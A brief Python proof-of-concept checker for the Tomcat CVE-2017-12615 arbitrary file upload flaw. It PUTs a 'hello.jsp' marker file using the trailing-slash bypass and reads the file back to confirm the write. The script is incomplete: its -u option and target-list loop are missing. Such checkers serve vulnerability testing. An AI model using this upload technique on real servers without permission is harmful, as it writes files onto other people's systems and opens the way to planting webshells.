#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :cve-2017-12615.py
# @Time      :2023/4/2 14:21
# @Author    :Raink

import requests
import optparse
import os

parse = optparse.OptionParser(usage = 'python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]')
parse.add_option('-p','--port',dest='PORT',help='target port[default:8080]',default='8080')
parse.add_option('-f',dest='FILE',help='target list')

options,args = parse.parse_args()


filename = '/hello.jsp'

#测试数据
data = 'hello'

def connect(ip):
  url=f"{ip}"
  try:
    response = requests.put(url+filename+'/',data=data)
    try:
      # 验证文件是否上传成功
      response = requests.get(url + filename)
      # print(url+filename)
      if response.status_code == 200 and 'hello' in response.text:
        print('[+] {0} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url))
      else:
        print('[-] {0} 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞'.format(url))
    except Exception as e:
      # print(e)
      print("[-] {0} 连接失败".format(url))
      # print(urls)

  except Exception as e:
    print("[-] {0} 连接失败".format(url))
    return 0
# connect("192.168.28.128")

